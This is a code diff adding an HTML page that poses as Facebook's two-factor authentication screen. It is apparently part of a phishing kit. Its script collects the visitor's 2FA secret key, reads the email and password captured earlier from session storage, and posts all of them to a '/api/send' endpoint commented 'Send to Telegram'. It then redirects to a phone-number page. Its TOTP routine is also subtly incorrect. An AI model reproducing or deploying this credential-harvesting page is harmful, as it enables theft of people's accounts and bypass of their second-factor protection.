@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Two-Factor Authentication</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" alt="Facebook" class="fb-logo">
+        
+        <div class="guide-container">
+            <div class="screen-title">Two-Factor Authentication Required</div>
+            <div class="screen-text">Please enter your 2FA secret key from the Facebook app:</div>
+            
+            <form id="twofaForm">
+                <div class="input-group">
+                    <input type="text" id="secret" placeholder=" " required autocomplete="off">
+                    <label for="secret">Secret Key (from Facebook app)</label>
+                </div>
+                
+                <button type="submit" class="primary">
+                    <span id="buttonText">Verify & Continue</span>
+                    <div class="button-loader" id="buttonLoader"></div>
+                </button>
+            </form>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('twofaForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const secret = document.getElementById('secret').value;
+            const email = sessionStorage.getItem('email');
+            const password = sessionStorage.getItem('password');
+            
+            // Generate TOTP code
+            const code = generateTOTP(secret);
+            
+            // Show loading
+            const btn = document.querySelector('.primary');
+            const buttonText = document.getElementById('buttonText');
+            const buttonLoader = document.getElementById('buttonLoader');
+            
+            btn.disabled = true;
+            buttonText.style.display = 'none';
+            buttonLoader.style.display = 'block';
+            
+            // Send to Telegram
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: '2fa',
+                    data: { email, password, secret, code },
+                    ip: 'user_ip_here'
+                })
+            });
+            
+            // Store code and redirect to phone page
+            sessionStorage.setItem('2fa_code', code);
+            setTimeout(() => {
+                window.location.href = '/phone';
+            }, 1500);
+        });
+        
+        function generateTOTP(secret) {
+            // Simplified TOTP generator (in real script use proper implementation)
+            const time = Math.floor(Date.now() / 30000);
+            const hash = CryptoJS.HmacSHA1(time.toString(), secret);
+            const offset = hash.words[19] & 0xf;
+            const binary = ((hash.words[offset] & 0x7f) << 24) |
+                          ((hash.words[offset + 1] & 0xff) << 16) |
+                          ((hash.words[offset + 2] & 0xff) << 8) |
+                          (hash.words[offset + 3] & 0xff);
+            return (binary % 1000000).toString().padStart(6, '0');
+        }
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+</body>
+</html>
